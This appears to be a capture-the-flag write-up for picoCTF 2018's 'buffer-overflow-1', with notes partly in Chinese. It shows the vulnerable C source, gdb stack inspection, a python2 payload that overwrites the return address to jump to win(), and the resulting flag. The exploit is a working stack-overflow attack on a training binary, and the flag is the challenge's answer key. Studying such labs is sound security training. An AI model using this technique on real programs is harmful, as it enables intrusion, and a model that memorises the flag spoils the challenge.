## Source code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

get_return_address() 會 return `[ebp+0x4]` 的內容，也就是目前 function 的 return address
```
(gdb) disas get_return_address
Dump of assembler code for function get_return_address:
   0x080486c0 <+0>:     mov    eax,DWORD PTR [ebp+0x4]
   0x080486c3 <+3>:     ret
```

## Pwn
```
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804862f <+0>:     push   ebp
   0x08048630 <+1>:     mov    ebp,esp
   0x08048632 <+3>:     sub    esp,0x28
   0x08048635 <+6>:     sub    esp,0xc
   0x08048638 <+9>:     lea    eax,[ebp-0x28]
   0x0804863b <+12>:    push   eax
   0x0804863c <+13>:    call   0x8048430 <gets@plt>
   0x08048641 <+18>:    add    esp,0x10
   0x08048644 <+21>:    call   0x80486c0 <get_return_address>
   0x08048649 <+26>:    sub    esp,0x8
   0x0804864c <+29>:    push   eax
   0x0804864d <+30>:    push   0x80487d4
   0x08048652 <+35>:    call   0x8048420 <printf@plt>
   0x08048657 <+40>:    add    esp,0x10
   0x0804865a <+43>:    nop
   0x0804865b <+44>:    leave
   0x0804865c <+45>:    ret
End of assembler dump.

(gdb) break *vuln+18
Breakpoint 1 at 0x8048641

(gdb) r
Starting program: /mnt/external/Code/ctf-playground/picoctf-2018/buffer-overflow-1/vuln
Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048641 in vuln ()
(gdb) x/100x $ebp-0x40
0xffffc568:     0xffffc5a8      0x08048641      0xffffc580      0x00000000
0xffffc578:     0xf7f96000      0x19d09700      0x41414141      0x41414141
0xffffc588:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffc598:     0x41414141      0x08004141      0x08048810      0x000003e8
0xffffc5a8:     0xffffc5c8      0x080486b3      0x00000001      0xffffc674
0xffffc5b8:     0xffffc67c      0x000003e8      0x00000000      0xffffc5e0
0xffffc5c8:     0x00000000      0xf7dcd991      0xf7f96000      0xf7f96000
0xffffc5d8:     0x00000000      0xf7dcd991      0x00000001      0xffffc674
0xffffc5e8:     0xffffc67c      0xffffc604      0x00000001      0x00000000
0xffffc5f8:     0xf7f96000      0xffffffff      0xf7ffcfb8      0x00000000
0xffffc608:     0xf7f96000      0xf7f96000      0x00000000      0x30a572e6
0xffffc618:     0x769c14f6      0x00000000      0x00000000      0x00000000
0xffffc628:     0x00000001      0x080484d0      0x00000000      0xf7fe9540
0xffffc638:     0xf7fe43f0      0xf7ffcfb8      0x00000001      0x080484d0
0xffffc648:     0x00000000      0x080484f1      0x0804865d      0x00000001
0xffffc658:     0xffffc674      0x080486d0      0x08048730      0xf7fe43f0
0xffffc668:     0xffffc66c      0xf7ffd910      0x00000001      0xffffc8c1
0xffffc678:     0x00000000      0xffffc907      0xffffc924      0xffffc976
0xffffc688:     0xffffc9ba      0xffffc9db      0xffffc9f7      0xffffca0a
0xffffc698:     0xffffca68      0xffffcbcf      0xffffcbda      0xffffcbe6
0xffffc6a8:     0xffffcc14      0xffffcc1f      0xffffcc37      0xffffcc54
0xffffc6b8:     0xffffcc68      0xffffcc7c      0xffffcc8c      0xffffccc6
0xffffc6c8:     0xffffccfa      0xffffcd24      0xffffcd5c      0xffffcd82
0xffffc6d8:     0xffffcda8      0xffffcdc4      0xffffcdf7      0xffffce11
0xffffc6e8:     0xffffce3c      0xffffce63      0xffffce8a      0xffffceb2

(gdb) x $ebp+4
0xffffc5ac:     0x080486b3

(gdb) disas win
Dump of assembler code for function win:
   0x080485cb <+0>:     push   ebp
```

把 `0x080486b3` 覆蓋成 `win()` 的 address 即可
```
$ python2 -c 'print 11 * 4 * "A" + "\xcb\x85\x04\x08"' | ./vuln
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80485cb
picoCTF{addr3ss3s_ar3_3asy56a7b196}
```

flag: `picoCTF{addr3ss3s_ar3_3asy56a7b196}`
